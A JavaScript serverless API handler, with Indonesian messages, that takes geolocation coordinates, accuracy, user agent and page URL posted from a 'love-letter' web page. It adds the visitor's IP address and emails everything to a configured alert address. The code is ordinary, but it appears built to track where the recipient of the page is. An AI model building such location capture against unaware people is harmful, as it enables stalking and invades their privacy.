import nodemailer from "nodemailer";

const LOCATION_EMAIL_ENABLED = (process.env.LOCATION_EMAIL_ENABLED ?? "true") !== "false";
const LOCATION_ALERT_EMAIL = process.env.LOCATION_ALERT_EMAIL ?? "";
const SMTP_HOST = process.env.SMTP_HOST ?? "";
const SMTP_PORT = Number.parseInt(process.env.SMTP_PORT ?? "587", 10);
const SMTP_SECURE = (process.env.SMTP_SECURE ?? "false") === "true";
const SMTP_USER = process.env.SMTP_USER ?? "";
const SMTP_PASS = process.env.SMTP_PASS ?? "";
const SMTP_FROM = process.env.SMTP_FROM ?? SMTP_USER;

const mailTransporter =
  SMTP_HOST && SMTP_USER && SMTP_PASS
    ? nodemailer.createTransport({
        host: SMTP_HOST,
        port: SMTP_PORT,
        secure: SMTP_SECURE,
        auth: {
          user: SMTP_USER,
          pass: SMTP_PASS
        }
      })
    : null;

function sendJson(res, status, payload) {
  res.status(status);
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.json(payload);
}

function sanitizeNumber(input) {
  const value = Number.parseFloat(input);
  return Number.isFinite(value) ? value : null;
}

function escapeHtml(text) {
  return String(text)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function parseBody(req) {
  if (req.body == null || req.body === "") {
    return {};
  }

  if (typeof req.body === "object") {
    return req.body;
  }

  if (typeof req.body === "string") {
    try {
      return JSON.parse(req.body);
    } catch {
      return null;
    }
  }

  return null;
}

function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"];

  if (typeof forwarded === "string" && forwarded.length > 0) {
    return forwarded.split(",")[0].trim();
  }

  return req.socket?.remoteAddress ?? "unknown";
}

export default async function handler(req, res) {
  if (req.method === "OPTIONS") {
    res.status(204).end();
    return;
  }

  if (req.method !== "POST") {
    sendJson(res, 405, { error: "Method not allowed" });
    return;
  }

  const payload = parseBody(req);
  if (payload == null) {
    sendJson(res, 400, { error: "Body JSON tidak valid" });
    return;
  }

  const latitude = sanitizeNumber(payload.latitude);
  const longitude = sanitizeNumber(payload.longitude);
  const accuracy = sanitizeNumber(payload.accuracy);

  if (latitude == null || longitude == null) {
    sendJson(res, 400, { error: "Latitude/longitude tidak valid" });
    return;
  }

  if (latitude < -90 || latitude > 90 || longitude < -180 || longitude > 180) {
    sendJson(res, 400, { error: "Latitude/longitude di luar batas" });
    return;
  }

  if (!LOCATION_EMAIL_ENABLED) {
    sendJson(res, 200, { ok: true, skipped: "disabled" });
    return;
  }

  if (!mailTransporter || !SMTP_FROM || !LOCATION_ALERT_EMAIL) {
    sendJson(res, 500, { error: "SMTP belum dikonfigurasi di environment Vercel" });
    return;
  }

  const mapUrl =
    typeof payload.mapUrl === "string" && payload.mapUrl.length > 0
      ? payload.mapUrl
      : `https://www.google.com/maps?q=${latitude},${longitude}`;
  const timestamp =
    typeof payload.capturedAt === "string" && payload.capturedAt.length > 0
      ? payload.capturedAt
      : new Date().toISOString();
  const pageUrl = typeof payload.pageUrl === "string" ? payload.pageUrl : "-";
  const userAgent = typeof payload.userAgent === "string" ? payload.userAgent : "-";
  const ipAddress = getClientIp(req);

  const subject = `Lokasi akses baru: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
  const text = [
    "Ada lokasi akses baru dari web love-letter.",
    "",
    `Waktu: ${timestamp}`,
    `Latitude: ${latitude.toFixed(6)}`,
    `Longitude: ${longitude.toFixed(6)}`,
    `Akurasi: ${accuracy == null ? "-" : accuracy.toFixed(2)} meter`,
    `Maps: ${mapUrl}`,
    `IP: ${ipAddress}`,
    `User Agent: ${userAgent}`,
    `Halaman: ${pageUrl}`
  ].join("\n");

  const html = `
    <h2>Lokasi akses baru</h2>
    <p>Ada lokasi akses baru dari web love-letter.</p>
    <ul>
      <li><strong>Waktu:</strong> ${escapeHtml(timestamp)}</li>
      <li><strong>Latitude:</strong> ${escapeHtml(latitude.toFixed(6))}</li>
      <li><strong>Longitude:</strong> ${escapeHtml(longitude.toFixed(6))}</li>
      <li><strong>Akurasi:</strong> ${escapeHtml(accuracy == null ? "-" : accuracy.toFixed(2))} meter</li>
      <li><strong>Maps:</strong> <a href="${escapeHtml(mapUrl)}">${escapeHtml(mapUrl)}</a></li>
      <li><strong>IP:</strong> ${escapeHtml(ipAddress)}</li>
      <li><strong>User Agent:</strong> ${escapeHtml(userAgent)}</li>
      <li><strong>Halaman:</strong> ${escapeHtml(pageUrl)}</li>
    </ul>
  `;

  try {
    const info = await mailTransporter.sendMail({
      from: SMTP_FROM,
      to: LOCATION_ALERT_EMAIL,
      subject,
      text,
      html
    });

    sendJson(res, 200, {
      ok: true,
      messageId: info.messageId
    });
  } catch (error) {
    console.error("Gagal mengirim email lokasi:", error);
    sendJson(res, 500, {
      error: error instanceof Error ? error.message : "Gagal mengirim email"
    });
  }
}
